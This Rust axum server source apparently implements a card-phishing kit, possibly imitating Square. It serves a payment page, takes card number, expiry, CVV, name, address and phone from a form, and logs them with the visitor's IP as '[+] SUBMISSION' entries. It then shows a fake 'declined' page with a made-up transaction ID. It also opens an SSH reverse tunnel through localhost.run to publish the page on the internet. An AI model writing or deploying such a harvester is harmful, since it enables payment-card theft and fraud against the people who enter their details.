use axum::{
    body::Body,
    extract::{Form, State},
    http::{header, Request, StatusCode},
    middleware::{self, Next},
    response::{IntoResponse, Response},
    routing::{get, post},
    Router,
};
use chrono::Local;
use serde::Deserialize;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};
use tokio::process::Command as TokioCommand;
use tokio::net::TcpListener as TokioTcpListener;

#[derive(Debug, Deserialize)]
struct SubmitForm {
    amount: Option<String>,
    cardnumber: Option<String>,
    exp: Option<String>,
    cvv: Option<String>,
    cardname: Option<String>,
    address: Option<String>,
    city: Option<String>,
    state: Option<String>,
    zip: Option<String>,
    phone: Option<String>,
}

fn get_writable_log_path() -> PathBuf {
    let mut candidates = vec![
        PathBuf::from("server.log"),
    ];
    if let Some(home) = dirs::home_dir() {
        candidates.push(home.join("square-server.log"));
    }
    candidates.push(std::env::temp_dir().join("square-server.log"));

    for candidate in candidates {
        let test_file = candidate.with_extension("tmp");
        if fs::write(&test_file, "ok").is_ok() {
            let _ = fs::remove_file(test_file);
            return candidate;
        }
    }
    PathBuf::from("server.log")
}

fn sanitize(text: &str) -> String {
    let sanitized: String = text.chars()
        .filter(|c| !c.is_control() || *c == ' ')
        .collect();
    
    if sanitized.len() > 50 {
        format!("{}...", &sanitized[..47])
    } else {
        sanitized
    }
}

fn log_message(log_path: &Path, color_code: &str, prefix: &str, message: &str) {
    let timestamp = Local::now().format("%H:%M:%S").to_string();
    
    // Absolute start of line: Color -> Timestamp -> Prefix -> Message -> Reset
    let console_line = format!("{}[{}] {:<12} {}\x1b[0m", color_code, timestamp, prefix, message);
    println!("{}", console_line);
    
    // Log to file: Timestamp -> Prefix -> Message
    let file_line = format!("[{}] {:<12} {}", timestamp, prefix, message);
    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(log_path) {
        let _ = writeln!(file, "{}", file_line);
    }
}

async fn get_available_port(start_port: u16) -> u16 {
    for port in start_port..=65535 {
        if TokioTcpListener::bind(("127.0.0.1", port)).await.is_ok() {
            return port;
        }
    }
    start_port
}

async fn start_tunnel(port: u16) {
    let cmd = format!("ssh -R 80:localhost:{} nokey@localhost.run", port);
    let mut child = TokioCommand::new("sh")
        .arg("-c")
        .arg(cmd)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("Failed to start tunnel");

    let stdout = child.stdout.take().unwrap();
    tokio::spawn(async move {
        use tokio::io::{AsyncBufReadExt, BufReader};
        let mut reader = BufReader::new(stdout).lines();
        let mut found_url = false;
        while let Ok(Some(line)) = reader.next_line().await {
            if line.contains("tcp://") || line.contains("https://") {
                if !found_url {
                    println!("[TUNNEL] Public URL: {}", line.trim());
                    found_url = true;
                }
            }
        }
    });
}

async fn log_request(
    State(state): State<ServerState>,
    req: Request<Body>,
    next: Next,
) -> Response {
    let method = req.method().clone();
    let path = sanitize(req.uri().path());
    
    let ip = req.extensions()
        .get::<std::net::SocketAddr>()
        .map(|addr| addr.ip().to_string())
        .unwrap_or_else(|| "127.0.0.1".to_string());

    let color = match method.as_str() {
        "GET" => "\x1b[32m",
        "POST" => "\x1b[31m",
        _ => "\x1b[33m",
    };

    // Log Request Start
    log_message(&state.log_path, color, "REQUEST", &format!("{} {} from {}", method, path, ip));

    let response = next.run(req).await;
    let status = response.status().as_u16();

    // Log Request End
    log_message(&state.log_path, color, "RESPONSE", &format!("{} -> {}", path, status));

    response
}

async fn handle_get_root(state: State<ServerState>) -> impl IntoResponse {
    let content = fs::read_to_string(&state.template_path).unwrap_or_else(|_| "Template not found".to_string());
    (
        StatusCode::OK,
        [(header::CONTENT_TYPE, "text/html; charset=utf-8")],
        content,
    )
}

async fn handle_post_submit(
    State(state): State<ServerState>,
    axum::extract::ConnectInfo(addr): axum::extract::ConnectInfo<std::net::SocketAddr>,
    Form(form): Form<SubmitForm>,
) -> impl IntoResponse {
    let amount = form.amount.clone().unwrap_or_else(|| "0.00".to_string());
    let txn_id = format!("TXN-{}", uuid::Uuid::new_v4().to_string()[..10].to_uppercase());

    let s = |opt: &Option<String>| sanitize(opt.as_deref().unwrap_or(""));

    let submitted = format!(
        "[+] SUBMISSION: Amt: {}, Card: {}, Exp: {}, CVV: {}, Name: {}, Addr: {}, City: {}, State: {}, Zip: {}, Phone: {}, IP: {}",
        s(&form.amount),
        s(&form.cardnumber),
        s(&form.exp),
        s(&form.cvv),
        s(&form.cardname),
        s(&form.address),
        s(&form.city),
        s(&form.state),
        s(&form.zip),
        s(&form.phone),
        addr.ip()
    );

    log_message(&state.log_path, "\x1b[33m", "SUBMIT", &submitted);

    let mut failure_page = fs::read_to_string(&state.declined_path).unwrap_or_else(|_| "Declined page not found".to_string());
    failure_page = failure_page.replace("{{ amount }}", &amount).replace("{{ transaction_id }}", &txn_id);

    (
        StatusCode::OK,
        [(header::CONTENT_TYPE, "text/html; charset=utf-8")],
        failure_page,
    )
}

#[derive(Clone)]
struct ServerState {
    template_path: PathBuf,
    declined_path: PathBuf,
    log_path: PathBuf,
}

#[tokio::main]
async fn main() {
    let port = get_available_port(5000).await;

    // Localhost.run tunnel
    start_tunnel(port).await;

    let log_path = get_writable_log_path();
    let template_path = PathBuf::from("template.html");
    let declined_path = PathBuf::from("declined.html");

    let state = ServerState {
        template_path,
        declined_path,
        log_path: log_path.clone(),
    };

    let app = Router::new()
        .route("/", get(handle_get_root))
        .route("/submit", post(handle_post_submit))
        .layer(middleware::from_fn_with_state(state.clone(), log_request))
        .with_state(state);

    let listener = TokioTcpListener::bind(format!("0.0.0.0:{}", port)).await.unwrap();
    println!("[INFO] Request logging enabled");
    println!("Server running on http://localhost:{}", port);

    axum::serve(listener, app.into_make_service_with_connect_info::<std::net::SocketAddr>()).await.unwrap();
}
